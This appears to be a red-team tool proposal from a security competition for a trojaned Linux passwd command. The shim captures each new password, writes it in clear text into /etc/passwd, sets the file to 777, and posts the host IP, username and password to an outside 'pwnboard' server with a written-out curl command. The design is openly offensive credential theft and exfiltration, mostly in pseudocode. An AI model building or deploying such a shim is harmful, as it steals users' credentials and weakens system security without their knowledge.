## Abstract
When blue teamers on Linux change their password via the passwd command we shim this binary to work as it normally does and change the hash in /etc/shadow. In older versions (like 1980 UNIX) the clear text password was the second field in Linux. Quickly this was realized to be a blunder as they say in chess, and nowadays this field is marked with a X placeholder. 
As a man of tradition I will reinstate this to its former glory by writing password to the /etc/password field 2 and the shadow in /etc/shadow so they dont know anything is gone. 

## Method
Shim /usr/bin/passwd via moving it to /user/bin/passwddddddddd and replacing it with /usr/bin/passwd.sh. The new sh script does the same task of hashing the password to /etc/shadow but also write the clear text to /etc/passwd.
# Sponsors
- Zach Price
- Leah Carvaris
- Brenner
- Cameron

### Potential Names
- The Renaissance
- Linux classic edition
- The gumpher
- Linux Patch 0.0.1

# Pseudo code

```Pseudo Code
mv passwd to passwdd
make a new file named passwd in the old location
chmod perms to 777

File contents:
Changeing password for $user
Current password: $password
New password: $new-password
Retype new password: $retype-password

$user in the command line arguement

Other three will be input fields

Write $new-password to /etc/passwd
Regex stupid bs to do that

use sed to insert the password hash

get the host ip and save it to $ip

curl -X POST -H "Content-Type: application/json" -d '{"ip": "$ip", "username": "$username", "password": "$password"}' https://www.pwnboard.win/creds
Ship creds to pwnboard

call old passwd (passwdd) and do a one liner

Issues you may encounter:
- sudo being required for /etc/passwd edits
- passwd one liners
```



(c) - Garrett T 2025


